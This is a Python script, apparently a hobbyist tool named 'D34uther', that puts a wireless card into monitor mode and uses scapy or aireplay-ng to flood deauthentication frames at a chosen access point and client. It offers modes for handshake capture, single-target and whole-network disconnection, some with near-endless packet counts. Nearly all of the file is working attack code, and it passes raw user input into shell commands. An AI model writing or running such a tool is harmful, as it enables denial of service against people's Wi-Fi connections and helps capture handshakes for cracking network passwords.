import os
from colorama import Fore, Back, Style
from scapy.all import *

# Banner

print(Fore.LIGHTYELLOW_EX + """

________  ________     _____         __  .__                  
\______ \ \_____  \   /  |  | __ ___/  |_|  |__   ___________
 |    |  \  _(__  <  /   |  ||  |  \   __\  |  \_/ __ \_  __ |
 |    `   \/       \/    ^   /  |  /|  | |   Y  \  ___/|  | \/
/_______  /______  /\____   ||____/ |__| |___|  /\___  >__|   
        \/       \/      |__|                 \/     \/       


Maded by Fr0z3n

Version:0.6.1

""")
print(Fore.LIGHTRED_EX)

# Gerekli bilgileri alıyoruz

bssid=str(input("BSSID:"))

target=str(input("Target's MAC (for specific target):"))

interface=str(input("Interface:"))
print("Target:"+target)
print("BSSID: "+bssid)
print("İnterface: "+interface)

# Monitör moda geçiyoruz

os.system('systemctl stop NetworkManager.service')
os.system('ifconfig '+interface+' down')
os.system('iwconfig '+interface+' mode monitor')
os.system('ifconfig '+interface+' up')

os.system('clear')

# Banner

print(Fore.LIGHTYELLOW_EX)
print("""
 ________  ________     _____         __  .__                  
\______ \ \_____  \   /  |  | __ ___/  |_|  |__   ___________
 |    |  \  _(__  <  /   |  ||  |  \   __\  |  \_/ __ \_  __ |
 |    `   \/       \/    ^   /  |  /|  | |   Y  \  ___/|  | \/
/_______  /______  /\____   ||____/ |__| |___|  /\___  >__|   
        \/       \/      |__|                 \/     \/       


Maded by Fr0z3n

Version:0.6.1

""")

print(Fore.LIGHTBLUE_EX)
print(Back.RED)

# İşlemimizi seçiyoruz

print("""

1)for Handshake                       
2)for Deauthentication (single target)
3)for Deauthentication (network)(you need aireplay-ng for this)    
99)Exit                               
for Stop CTRL+C                       """ + Style.RESET_ALL)

print(Fore.LIGHTBLUE_EX)


choose=int(input("Choose: "))
print(Fore.LIGHTYELLOW_EX)
if choose==1:
  dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid)
  packet = RadioTap()/dot11/Dot11Deauth(reason=7)
  sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)
  os.system('systemctl start NetworkManager.service')
  os.system('ifconfig '+interface+' down')
  os.system('iwconfig '+interface+' mode managed')
  os.system('ifconfig '+interface+' up')
  print("Thanks for Using D34uther")
  exit
if choose==2:
  dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid)
  packet = RadioTap()/dot11/Dot11Deauth(reason=7)
  sendp(packet, inter=0.1, count=99999999999, iface=interface, verbose=1)
  os.system('systemctl start NetworkManager.service')
  os.system('ifconfig '+interface+' down')
  os.system('iwconfig '+interface+' mode managed')
  os.system('ifconfig '+interface+' up')
  print("Thanks for Using D34uther")
  exit
if choose==3:
  os.system('aireplay-ng --deauth 0 -a '+bssid+' '+interface)
  os.system('systemctl start NetworkManager.service')
  os.system('ifconfig '+interface+' down')
  os.system('iwconfig '+interface+' mode managed')
  os.system('ifconfig '+interface+' up')
  print("Thanks for Using D34uther")
  exit
if choose==99:
  os.system('ifconfig '+interface+' down')
  os.system('iwconfig '+interface+' mode managed')
  os.system('ifconfig '+interface+' up')
  os.system('systemctl start NetworkManager.service')
  exit
else:
  os.system('systemctl start NetworkManager.service')
  os.system('ifconfig '+interface+' down')
  os.system('iwconfig '+interface+' mode managed')
  os.system('ifconfig '+interface+' up')
  print("Thanks for Using D34uther")
  exit

print(Style.RESET_ALL)

input("Press Enter to Exit")

os.system('systemctl start NetworkManager.service')
os.system('ifconfig '+interface+' down')
os.system('iwconfig '+interface+' mode managed')
os.system('ifconfig '+interface+' up')
